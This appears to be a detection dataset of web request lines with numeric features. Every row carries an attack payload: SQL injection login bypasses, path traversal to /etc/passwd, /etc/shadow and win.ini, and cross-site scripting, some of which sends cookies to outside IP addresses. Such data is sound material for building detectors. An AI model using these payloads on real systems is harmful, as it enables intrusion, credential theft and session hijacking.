75,2,200,1321,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7413,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2308,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7489,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5508,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4423,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3951,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1880,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3252,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6197,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5917,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5480,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7012,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1068,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3877,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5782,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4564,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7833,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7138,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6420,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7930,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7672,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5277,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2166,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7172,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1027,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7874,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1413,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2436,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4584,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3344,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1662,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4324,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7612,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5340,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3379,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7433,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3221,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3237,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1202,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5813,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1483,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1566,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7287,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3882,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5582,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3952,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7876,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2499,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6797,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7607,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6884,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2468,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5748,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4694,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5186,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1505,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4170,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4767,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2115,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6855,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6963,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3144,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7385,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7665,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6978,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1161,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3716,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3235,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
47,1,200,5742,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,3253,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,2183,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,4117,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,7967,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,4120,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,5386,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,5457,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,4738,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,3391,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,7277,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,7352,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,6990,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,6133,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,4745,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,3346,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
49,1,200,6474,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3508,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2804,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6100,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3033,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2366,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6936,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,1489,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,1545,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3598,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2436,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3601,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,1563,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4917,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,7120,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3791,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
32,1,200,4802,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7852,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1219,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3200,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3086,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5653,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7316,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3038,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2217,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6591,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6632,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6829,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5837,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2305,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3412,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4744,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2387,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3426,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4876,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6120,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1607,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6352,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5140,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5591,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6570,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2170,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2557,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4730,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3577,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7038,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1432,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2970,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4806,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5588,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3154,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6694,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7665,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3950,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5306,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6631,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5783,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1044,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1132,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2389,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1024,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1320,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6500,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7947,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2894,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3018,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7075,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5066,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5287,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5406,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7384,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3109,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1291,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6869,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5924,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6022,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1784,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5585,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7949,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5411,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5024,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2603,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6669,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1992,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6887,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5907,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2648,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2701,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
81,1,200,7692,7,38,14,5,2,GET /?name=<script>window.location.href="http://39.167.209.171"</script> HTTP/1.1
98,1,200,4522,7,51,19,6,2,GET /?p=<script>window.location='http://227.172.86.227/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,1053,7,40,14,5,2,GET /?search=<script>window.location.href="http://214.231.63.234"</script> HTTP/1.1
80,1,200,5818,7,38,14,5,2,GET /?name=<script>window.location.href="http://194.36.135.44"</script> HTTP/1.1
62,1,200,2140,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4997,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4165,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,2891,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5802,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,7836,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,1155,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,7054,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6605,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,1332,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,7045,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5199,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
35,1,200,1881,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5095,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,2632,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,2505,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3337,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,4952,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5303,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3886,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3415,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,1580,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,2867,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,6256,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,7987,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3850,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5640,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
57,1,200,1378,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7577,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1812,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3308,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1496,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4652,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,2232,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1645,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,2451,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3051,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4477,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3156,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4391,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3312,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
77,1,200,7489,7,28,17,6,2,GET /?p=<script><script+src="http://64.160.70.8/117305.js=></script> HTTP/1.1
51,1,200,6885,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2910,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6761,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4519,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6293,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6770,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5428,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1874,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1173,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5683,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1958,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
50,1,200,4850,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2012,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6026,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3384,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7822,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7370,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2132,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7985,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7415,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2357,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2095,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,5092,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4433,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6459,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4282,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6483,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4035,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,5451,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4818,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3602,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4491,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7089,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
100,1,200,7461,7,54,19,6,2,GET /?name=<script>window.location='http://128.79.53.115/?cookie='+document.cookie</script> HTTP/1.1
48,1,200,2286,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4266,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,6923,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7024,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,6092,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,5179,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1913,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,6043,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,5610,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,3836,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1089,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,2848,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1404,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,6149,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,2878,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
44,1,200,1362,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7307,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4786,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,1353,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5667,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,6521,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5676,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,6626,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,1251,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,3494,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,2616,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
